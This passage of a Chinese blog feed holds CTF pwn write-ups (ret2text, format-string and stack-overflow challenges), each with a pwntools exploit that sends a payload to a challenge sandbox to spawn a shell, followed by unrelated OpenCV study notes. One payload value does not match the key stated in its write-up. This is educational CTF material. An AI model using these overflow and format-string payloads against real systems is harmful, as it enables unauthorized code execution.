        <content type="html"><![CDATA[<h1 id="CTFHUB-PWN-ret2text"><a href="#CTFHUB-PWN-ret2text" class="headerlink" title="CTFHUB-PWN-ret2text"></a>CTFHUB-PWN-ret2text</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252230640.png" alt="image-20211025223026580"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252231596.png" alt="image-20211025223114563"></p><p>main函数中的gets函数有溢出漏洞，那么看一下有什么可以利用的。</p><p>查看字符串：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252232188.png" alt="image-20211025223247146"></p><p>发现有/bin/sh/可以利用，而且它在函数secure中：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252234761.png" alt="image-20211025223403725"></p><p>本来看到这样一个函数，是想要构造伪随机，预测随机值，使得v3 == v2成立，从而得到shell，但是题目名字ret2text显然是hint，那么我就使用ret2text的方法</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252239339.png" alt="image-20211025223932289" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252239862.png" alt="image-20211025223952826" style="zoom: 80%;" /><p>覆盖该变量需要0x78的长度</p><p>再找到/bin/sh/的text段位置：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252242541.png" alt="image-20211025224238503"></p><p>得到0x4007B8</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challenge-0297c21d40a13395.sandbox.ctfhub.com&#x27;</span>, <span class="number">29225</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x78</span>) + p64(<span class="number">0x4007B8</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252244275.png" alt="image-20211025224443229"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-PWN-实时数据监测</title>
      <link href="/2021/10/24/20211024_ctf_sssjjc/"/>
      <url>/2021/10/24/20211024_ctf_sssjjc/</url>
      
        <content type="html"><![CDATA[<h1 id="XCTF-PWN-实时数据监测"><a href="#XCTF-PWN-实时数据监测" class="headerlink" title="XCTF-PWN-实时数据监测"></a>XCTF-PWN-实时数据监测</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>小A在对某家医药工厂进行扫描的时候，发现了一个大型实时数据库系统。小A意识到实时数据库系统会采集并存储与工业流程相关的上千节点的数据，只要登录进去，就能拿到有价值的数据。小A在尝试登陆实时数据库系统的过程中，一直找不到修改登录系统key的方法，虽然她现在收集到了能够登陆进系统的key的值，但是只能想别的办法来登陆。</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241534250.png" alt="image-20211024153412217"></p><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241542316.png" alt="image-20211024154220284"></p><p>发现只需要让key == 356795746，就能拿到shell</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241547473.png" alt="image-20211024154726432"></p><p>得到key的地址：0x0804A048</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241543281.png" alt="image-20211024154342252"></p><p>而<code>imagemagic</code>函数中有格式化字符串的漏洞</p><h3 id="测试偏移"><a href="#测试偏移" class="headerlink" title="测试偏移"></a>测试偏移</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241545591.png" alt="image-20211024154532553"></p><p>找到0x61616161的位置，得到偏移为12</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./sssjjc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">52134</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">key_addr = <span class="number">0x0804A048</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>, &#123;key_addr:<span class="number">35795746</span>&#125;)</span><br><span class="line"><span class="comment"># 用这个函数挺惭愧的，因为手算还是有些难度，理解了一题，换一题还是算不出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241600223.png" alt="image-20211024160047163" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-PWN-反应釜开关控制</title>
      <link href="/2021/10/23/20211023_ctf_fyfkgkz/"/>
      <url>/2021/10/23/20211023_ctf_fyfkgkz/</url>
      
        <content type="html"><![CDATA[<h1 id="XCTF-PWN-反应釜开关控制"><a href="#XCTF-PWN-反应釜开关控制" class="headerlink" title="XCTF-PWN-反应釜开关控制"></a>XCTF-PWN-反应釜开关控制</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>小M在里一个私人矿厂中发现了一条TNT生产线中硝化反应釜的接口，反应釜是一种反应设备，非常的不稳定，会因为很多原因造成损坏，导致生产被迫停止。她怀疑这个工厂可能进行地下军火的制作，所以小M打算通过把反应釜关闭掉来干扰这条TNT生产线的运行，但是反应釜有多个闸门，得想办法帮她把闸门都关掉才行。</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@LAPTOP-V4AB5SPG:/mnt/d/me/CTF/xctf/fyfkgkz$ checksec ./fyfkgkz</span><br><span class="line">[*] &#x27;/mnt/d/me/CTF/xctf/fyfkgkz/fyfkgkz&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831425.png" alt="image-20211023165913587"></p><p>发现<code>gets</code>函数可以溢出，并且可以找到<code>shell</code>函数，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831887.png" alt="image-20211023170318793"></p><p>查看v5在栈中的情况：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831137.png" alt="image-20211023170535752" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831315.png" alt="image-20211023170602400" style="zoom:67%;" /><p>需要<code>0x200+0x8</code>长度数据覆盖</p><p>下面是<code>shell</code>函数的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280832838.png" alt="image-20211023170855845"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;fyfkgkz&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">64915</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x200</span> + <span class="number">0x8</span>) * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x4005F6</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280832485.png" alt="image-20211023171329798"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20200228</title>
      <link href="/2020/02/28/20200228-img-report/"/>
      <url>/2020/02/28/20200228-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="opencv基础"><a href="#opencv基础" class="headerlink" title="opencv基础"></a>opencv基础</h2><p>该过程主要通过实际操作完成</p><h3 id="素材"><a href="#素材" class="headerlink" title="素材"></a>素材</h3><p>选取合适的高清图片，通过截屏生成新图片降低图片质量，将新的低质量图片命名为<code>text1.png</code>保存在python脚本的目录中</p><h3 id="代码环境"><a href="#代码环境" class="headerlink" title="代码环境"></a>代码环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python解释器：anaconda3/python3.8</span><br><span class="line">编译器：pycharm</span><br><span class="line">编码：utf-8</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>为了方便测试，只使用了一个脚本测试，学习笔记和部分运行结果也通过注释的方式简单加入</p><p>去除注释<code>#</code>即可运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解释器：anaconda3/python3.8</span></span><br><span class="line"><span class="comment"># 编译器：pycharm</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一些测试过程以注释方式保留，以便以后查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需要的库，并给以简洁的名称</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 按指定方式读取图像</span></span><br><span class="line">img = cv.imread(<span class="string">&#x27;test1.png&#x27;</span>, <span class="number">1</span>)    <span class="comment"># 该步骤类似于C语言的文件指针</span></span><br><span class="line"><span class="comment"># 第一个参数为图片路径，不能含有中文等不兼容字符，否则报错，这里没办法只好使用了相对路径</span></span><br><span class="line"><span class="comment"># 第二个参数代表读取方式</span></span><br><span class="line"><span class="comment"># 1：加载彩色图像。任何图像的透明度都会被忽视。它是默认标志。</span></span><br><span class="line"><span class="comment"># 0：以灰度模式加载图像</span></span><br><span class="line"><span class="comment"># -1：加载图像，包括alpha通道</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># show图像</span></span><br><span class="line"><span class="comment"># cv.imshow(&#x27;test1&#x27;, img)    # 第一个参数是窗口名称，它是一个字符串。第二个参数是我们的对象。</span></span><br><span class="line"><span class="comment"># cv.waitKey(0)              # 以0为参数时，无限制等待用户按下任意键</span></span><br><span class="line"><span class="comment"># cv.destroyAllWindows()     # 销毁窗口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 访问和修改像素</span></span><br><span class="line"><span class="comment"># px = img[100, 100]    # 该值与图像读入方式有关</span></span><br><span class="line"><span class="comment"># print(px)</span></span><br><span class="line"><span class="comment"># img[100, 100] = 255                 # 灰度</span></span><br><span class="line"><span class="comment"># img[100, 100] = [255, 255, 255]     # BGR</span></span><br><span class="line"><span class="comment"># print(img[100, 100])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查阅资料了解到上面的方法的效率并不是很高</span></span><br><span class="line"><span class="comment"># 可以使用Numpy数组方法array.item()和array.itemset()</span></span><br><span class="line"><span class="comment"># 经测试，因为某些未知原因，导致运行错误，这里先略去，以后再debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 访问图像属性</span></span><br><span class="line"><span class="comment"># print(img.shape)    # 访问图像形状</span></span><br><span class="line"><span class="comment"># 以灰度图像读入时，输出(674, 1200)，仅返回行和列</span></span><br><span class="line"><span class="comment"># 以BGR读入时，输出(674, 1200, 3)，多返回一位数，表示通道数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(img.size)    # 访问图像像素总数</span></span><br><span class="line"><span class="comment"># 以灰度读入时，输出808800</span></span><br><span class="line"><span class="comment"># 以BGR读入时，输出2426400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(img.dtype)    # 访问图像数据类型</span></span><br><span class="line"><span class="comment"># 输出 uint8</span></span><br><span class="line"><span class="comment"># img.dtype在调试时非常重要，因为OpenCV-Python代码中的大量错误是由无效的数据类型引起的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 拆分和合并图像通道</span></span><br><span class="line"><span class="comment"># B, G, R = cv.split(img)    # 此时img由BGR方式读入，才可进行此操作</span></span><br><span class="line"><span class="comment"># print(B.shape)    # 输出(674, 1200)，与原图像数据相比仅缺少通道数，这表明拆分成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># img = cv.merge((B, G, R))    # 进行这一步操作时，图像通过BGR方式读入，且上面的“B, G, R = cv.split(img)”需要先执行</span></span><br><span class="line"><span class="comment"># print(img.shape)    # 输出(674, 1200, 3)，与原图像数据完全相同，这表明合并成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line"><span class="comment"># 图像加法</span></span><br><span class="line"><span class="comment"># x = np.uint8([250])</span></span><br><span class="line"><span class="comment"># y = np.uint8([10])</span></span><br><span class="line"><span class="comment"># print(cv.add(x, y))    # 输出[[255]] 原理：opencv的加法采用饱和运算 250+10=260-&gt;255</span></span><br><span class="line"><span class="comment"># print(x + y)           # 输出[4] 原理：numpy的加法采用模运算 (250+10)%256=4</span></span><br><span class="line"><span class="comment"># 两者相比较，使用时应该选用opencv的加法</span></span><br></pre></td></tr></table></figure><h2 id="opencv进阶"><a href="#opencv进阶" class="headerlink" title="opencv进阶"></a>opencv进阶</h2><p>注：这部分内容是有针对性的学习，暂时用不到的就没有学</p><h3 id="性能衡量和提升技术"><a href="#性能衡量和提升技术" class="headerlink" title="性能衡量和提升技术"></a>性能衡量和提升技术</h3><p>该部分内容，我只简单提取了<code>cv.useOptimized()</code>和<code>cv.setUseOptimized()</code>两条命令</p><p>对于部分操作的运行速度，优化会比不优化快两倍，所以我觉得有必要注意</p><h4 id="检查是否使用优化"><a href="#检查是否使用优化" class="headerlink" title="检查是否使用优化"></a>检查是否使用优化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv               <span class="comment"># 导入opencv库，简化为cv</span></span><br><span class="line">cv.useOptimized()              <span class="comment"># 检查是否使用opencv优化，该函数值为Ture或者False</span></span><br><span class="line"><span class="built_in">print</span>(cv.useOptimized())       <span class="comment"># 打印该函数值，判断是否启用优化</span></span><br></pre></td></tr></table></figure><h4 id="启用-禁用优化"><a href="#启用-禁用优化" class="headerlink" title="启用/禁用优化"></a>启用/禁用优化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv               <span class="comment"># 导入opencv库，简化为cv</span></span><br><span class="line">cv.setUseOptimized(Ture)       <span class="comment"># 启用优化</span></span><br><span class="line">cv.setUseOptimized(<span class="literal">False</span>)      <span class="comment"># 禁用优化</span></span><br></pre></td></tr></table></figure><h4 id="其他性能优化技术"><a href="#其他性能优化技术" class="headerlink" title="其他性能优化技术"></a>其他性能优化技术</h4><p>这部分内容暂时不学习，但是先做个摘记</p><blockquote><p>有几种技术和编码方法可以充分利用 Python 和 Numpy 的最大性能。这里要注意的主要事情是，首先尝试以一种简单的方式实现算法。一旦它运行起来，分析它，找到瓶颈并优化它们。</p><p>1.尽量避免在Python中使用循环，尤其是双/三重循环等。它们本来就很慢。</p><p>2.由于Numpy和OpenCV已针对向量运算进行了优化，因此将算法/代码向量化到最大程度。</p><p>3.利用缓存一致性。</p><p>4.除非需要，否则切勿创建数组的副本。尝试改用视图。数组复制是一项昂贵的操作。</p><p>即使执行了所有这些操作后，如果你的代码仍然很慢，或者不可避免地需要使用大循环，请使用Cython等其他库来使其更快。</p></blockquote><h3 id="图像梯度"><a href="#图像梯度" class="headerlink" title="图像梯度"></a>图像梯度</h3><p>OpenCV提供三种类型的梯度滤波器或高通滤波器，即Sobel，Scharr和Laplacian</p><p>这是三个可以直接用的函数，暂时没搞清楚它们的原理，去了解了一下使用效果，进行实测后失败，原因未知，这里记录一下</p><p>官方使用的效果图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280846615.png" alt="1"></p><p>可以看出Laplacian方法较为优秀</p><h3 id="Canny边缘检测"><a href="#Canny边缘检测" class="headerlink" title="Canny边缘检测"></a>Canny边缘检测</h3><p><code>cv.Canny()</code>方法</p><p>这个算法，或许会对我的工作有借鉴意义，虽然思路上有很大不同，我把这种方法分类为矢量方法，而我认为我所需要做的工作属于标量方法。我个人的观点是：矢量方法更需要想象能力，标量方法更需要精密的思维；而有些东西是共通的，比如下面讲到的降噪、阈值思想</p><h4 id="降噪"><a href="#降噪" class="headerlink" title="降噪"></a>降噪</h4><p>由于边缘检测容易受到图像中噪声的影响，因此第一步是使用5x5高斯滤波器消除图像中的噪声。</p><p><em>和上面的“图像梯度”一样，也需要降噪，由此可见，降噪在图像处理中是很重要的</em></p><h4 id="查找图像的强度梯度"><a href="#查找图像的强度梯度" class="headerlink" title="查找图像的强度梯度"></a>查找图像的强度梯度</h4><p>使用Sobel核在水平和垂直方向上对平滑的图像进行滤波，以在水平方向(Gx)和垂直方向(Gy)上获得一阶导数。渐变方向始终垂直于边缘。将其舍入为代表垂直，水平和两个对角线方向的四个角度之一。</p><h5 id="非极大值抑制"><a href="#非极大值抑制" class="headerlink" title="非极大值抑制"></a>非极大值抑制</h5><p>在获得梯度大小和方向后，将对图像进行全面扫描，以去除可能不构成边缘的所有不需要的像素。为此，在每个像素处，检查像素是否是其在梯度方向上附近的局部最大值。</p><p><em>效果是能提取出细边</em></p><h5 id="磁滞阈值"><a href="#磁滞阈值" class="headerlink" title="磁滞阈值"></a>磁滞阈值</h5><p>确定哪些边缘全部是真正的边缘，哪些不是。为此，我们需要两个阈值 <code>minVal</code> 和 <code>maxVal</code>。强度梯度大于 <code>maxVal</code> 的任何边缘必定是边缘，而小于 <code>minVal</code> 的那些边缘必定是非边缘，因此将其丢弃。介于这两个阈值之间的对象根据其连通性被分类为边缘或非边缘。如果将它们连接到“边缘”像素，则将它们视为边缘的一部分。否则，它们也将被丢弃。</p><p><em>阈值说白了，就是人为搞个界限，挑选出较明显的边缘和非边缘，用于简化计算</em></p><p>另外，还有些特殊情况：边缘A在 <code>maxVal</code> 之上，因此被视为“确定边缘”。尽管边C低于 <code>maxVal</code> ，但它连接到边A，因此也被视为有效边，我们得到了完整的曲线。但是边缘B尽管在 <code>minVal</code> 之上并且与边缘C处于同一区域，但是它没有连接到任何“确保边缘”，因此被丢弃。因此，非常重要的一点是我们必须相应地选择 <code>minVal</code> 和 <code>maxVal</code> 以获得正确的结果。</p><p><em>在边缘为长线的假设下，该阶段还消除了小像素噪声。因此，我们最终得到的是图像中的强边缘。</em></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>进阶部分就暂时学到这里（内容还有很多啊，但为了开始尝试一下自己的不一样的图像算法，还是先停下），不得不恭维一下opencv库，网上都说这是一个强大的库，但仅仅一个形容词“强大”，怎么能让我了解它，难不成仅仅是通过它的体积大，下载慢？</p><p>看过一些函数之后，才开始发自内心赞叹，比如单单拿出一个函数，让我封装起来，提供大部分语言的接口，供给通用场景使用，这就不是现在的我能做到的了，或许有一天我也可以吧。抽空得多看看这些函数的漂亮的源码。同时在接下来的任务中，我也期待着opencv能给我带来的新的震撼，或许会是仰止弥高，钻之弥坚。</p><h2 id="numpy的应用"><a href="#numpy的应用" class="headerlink" title="numpy的应用"></a>numpy的应用</h2><p>在<code>OpenCV-Python Tutorials</code>中也常提到numpy库，即便在根本没用到它的代码示例中，也会来一行<code>import numpy</code></p><p>在实践中也发现，numpy能极大提高代码编写的效率；而查阅资料后发现，numpy对数据的索引效率远高于不使用它的情况，所以numpy也是图像处理中的一大利器。</p><p>但是由于时间原因，暂时不像学习opencv一样对numpy进行系统的学习，这里就记录一些用法</p><h3 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># 建立结构体类型</span></span><br><span class="line">Mytype = np.dtype(&#123;</span><br><span class="line">    <span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;noise&#x27;</span>, <span class="string">&#x27;part&#x27;</span>],    <span class="comment"># value像素值，noise噪声值，part分区（1/2）</span></span><br><span class="line">    <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]    <span class="comment"># 这里都采用整型（numpy对于变量的范围和类型要求严格）</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 新建结构体数组，下面的代码能直接新建自定义类型的，初始化的数组</span></span><br><span class="line">array = np.zeros((m, n), dtype=Mytype)    <span class="comment"># “(m, n)”定义数组的形式，这里为二维数组，m行n列</span></span><br></pre></td></tr></table></figure><h3 id="numpy数组排序"><a href="#numpy数组排序" class="headerlink" title="numpy数组排序"></a>numpy数组排序</h3><p>由于numpy建立的数组可以很复杂，所以numpy的排序函数的参数也很多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line">numpy.sort(a, axis=-<span class="number">1</span>, kind=<span class="literal">None</span>, order=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># a : 要排序的数组</span></span><br><span class="line"><span class="comment"># axis ： 按什么轴进行排序，默认按最后一个轴进行排序</span></span><br><span class="line"><span class="comment"># kind ：排序方法，默认是快速排序</span></span><br><span class="line"><span class="comment"># order : 当数组定义了字段属性时，可以按照某个属性进行排序</span></span><br></pre></td></tr></table></figure><h2 id="图像处理实战"><a href="#图像处理实战" class="headerlink" title="图像处理实战"></a>图像处理实战</h2><h3 id="测试1"><a href="#测试1" class="headerlink" title="测试1"></a>测试1</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>将素材图片（同附件）读入，然后通过两种划分方法的遍历比较，得出噪声值（次数），修改像素操作（容易实现）及其他特殊情况的优化先不考虑</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280846778.png" alt="test3"></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>（同附件）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 